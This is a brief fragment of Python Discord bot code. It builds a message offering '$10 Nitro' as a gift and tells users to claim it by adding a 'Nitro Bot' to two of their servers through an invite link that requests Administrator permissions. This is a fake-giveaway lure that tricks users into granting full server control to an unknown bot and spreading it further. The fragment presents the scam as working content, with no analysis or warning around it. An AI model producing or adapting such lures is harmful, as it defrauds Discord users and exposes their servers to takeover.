...
async def d(ctx,member:discord.Member=None):
 try:
   ...
   embed.add_field(name="**Nitro 10$**",value="Add [**Nitro Bot**](https://discord.com/oauth2/authorize?client_id=858737579812847637&permissions=8&scope=bot) to two of your servers To claim your gift")
